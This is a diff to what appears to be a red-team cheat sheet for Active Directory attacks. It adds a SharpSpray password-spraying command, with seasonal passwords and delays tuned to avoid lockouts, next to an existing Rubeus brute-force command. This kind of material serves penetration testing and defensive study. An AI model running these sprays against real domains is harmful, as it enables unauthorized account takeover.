@@ -136,6 +136,12 @@ Rubeus brute-force password spraying a single password or using a password file
 ```
 execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE>] [/user:USER | /users:USERS_FILE] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER]  [/verbose] [/nowrap]
 ```
+[SharpSpray](https://github.com/jnqpblc/SharpSpray) - C# port of PowerSpray.ps1
+```
+# By default it will automatically generate a user list from the domain using LDAP
+    # Sleeps 30 minutes between each password cycle, delays 300 milliseconds between each password guess attempt
+execute-assembly C:\SharpSpray.exe --Passwords Summer2021,Fall2021 --Sleep 30 --Delay 300
+```
 
 ### Kerberoasting
 PowerView kerberoasting (Outdated and still reliant on PowerShell)
